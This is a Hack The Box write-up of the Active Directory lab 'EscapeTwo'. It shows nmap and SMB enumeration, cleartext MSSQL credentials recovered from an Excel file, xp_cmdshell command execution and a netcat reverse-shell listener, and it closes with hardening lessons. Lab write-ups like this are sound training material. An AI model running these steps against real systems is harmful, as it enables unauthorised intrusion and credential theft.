<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" /> <img src="https://img.shields.io/badge/Anka0x-0f172a?style=flat-square" /> <img src="https://img.shields.io/badge/🎯%20Role-Internal%20Pentest-1e293b?style=flat-square" /> <img src="https://img.shields.io/badge/📜%20Certification-PNPT%20(TCM%20Security)-334155?style=flat-EscapeTwo" /> <img src="https://img.shields.io/badge/🟢%20Status-Completed-16a34a?style=flat-EscapeTwo" />

<div align="left">

# 💾 Hack The Box: EscapeTwo

![Category: Active Directory](https://img.shields.io/badge/Category-Active%20Directory-red)<br>
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>



---

## 📌 Overview

**EscapeTwo** is a Windows Active Directory machine that focuses on **Microsoft SQL Server security** and the risks of **improperly protected enterprise file shares**.

This lab demonstrates how a **weak service account configuration**, combined with **sensitive data stored inside Excel workbooks**, can be chained into **remote code execution (RCE)** using built‑in MSSQL functionality.

The attack path mirrors real internal engagements where attackers pivot from **data exposure → credential harvesting → service abuse**.

---

## 🔗 Attack Chain Summary

* Reconnaissance and service discovery via `nmap`
* SMB enumeration leading to discovery of sensitive `.xlsx` files
* Manual forensic analysis of Excel XML structures
* Credential harvesting for a high‑privilege SQL account
* Initial access and RCE via `xp_cmdshell` on MSSQL

---

## 🛠 Tools Used
```
| Tool                   | Purpose                                |
nmap                  → service discovery & OS fingerprinting
netexec / nxc         → SMB & MSSQL credential validation
impacket-smbclient    → interactive SMB share navigation
7z                    → file verification & archive extraction
impacket-mssqlclient  → MSSQL interaction & command execution
```

---

## 🔍 Enumeration

### 🔎 Nmap Recon

The initial scan identifies the target as **DC01.sequel.htb**, a **Windows Server 2019 Domain Controller**.

```bash
nmap -sC -sV -T4 10.129.18.116 -oN nmap_result.txt
```
![Image](Images/nmap.png)
**Observations:**

* DNS (53), Kerberos (88), LDAP (389) — Domain Controller confirmed
* SMB (445) — File share enumeration vector
* MSSQL (1433) — Microsoft SQL Server 2019 exposed

---

## 📁 SMB Enumeration & Data Exfiltration

Using the previously obtained **rose** account, available SMB shares are enumerated.

```bash
netexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
```
![Image](Images/2.png)
![Image](Images/3.png)
**Discovery:**

* **Accounting** share accessible with READ permissions
* Files of interest discovered:

  * `accounting_2024.xlsx`
  * `accounts.xlsx`

---

## 🧪 Forensic Analysis — The Excel Vector

### 1️⃣ Deconstructing the `.xlsx` File

Modern Excel files use the **Office Open XML** format and are effectively ZIP archives.

```bash
file accounts.xlsx
7z x accounts.xlsx
```
![Image](Images/4.png)
![Image](Images/5.png)
---

### 2️⃣ Credential Harvesting

Excel stores cell string data inside `xl/sharedStrings.xml`. Manual inspection reveals **cleartext credentials**.

**Recovered Credentials:**

```
Username: sa@sequel.htb
Password: MSSQLP@ssw0rd!
```
![Image](Images/6.png)
![Image](Images/7.png)
This account holds **sysadmin‑level privileges** on the MSSQL instance.

---

## ⚡ Initial Access — MSSQL Exploitation

### 1️⃣ Authenticating to the Database

Credentials are validated using **NetExec**.

```bash
impacketmssqlclient 10.129.232.128 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```
![Image](Images/8.png)
The `(Pwn3d!)` tag confirms **sysadmin access**.

---

### 2️⃣ Remote Code Execution (RCE)

Using **impacket-mssqlclient**, we connect to the database and abuse the dangerous `xp_cmdshell` stored procedure.

```sql
EXEC xp_cmdshell 'whoami';
```

**Result:**

```
sequel\sql_svc
```
![Image](Images/9.png)
Command execution is achieved in the context of the SQL service account.

---

## 👑 Privilege Escalation Path

With command execution as `sql_svc`, a reverse shell listener is prepared.

```bash
nc -lnvp 4455
```

Due to assigned privileges such as **SeImpersonatePrivilege**, the SQL service account can be abused to escalate to **SYSTEM‑level control** of the host.

---

## 🧠 What This Box Teaches

* **XML File Forensics**
  Sensitive data often hides inside Office document sub‑structures

* **SQL Service Hardening**
  Default accounts like `sa` must be secured and `xp_cmdshell` disabled

* **Information Leakage**
  Unsecured file shares are a primary source of credentials used for lateral movement

---

## 📌 Conclusion

Sequel highlights how data exposure, not exploits, often initiates compromise. When sensitive documents, powerful service accounts, and insecure defaults coexist, full system compromise becomes inevitable.
---
This work is part of **FuzzRaiders**’ structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor and real-world security execution

Happy hacking 🚀

---

### Author: Anka0X
---
## [LinkedIn:](https://www.linkedin.com/in/manka-sec/)
---

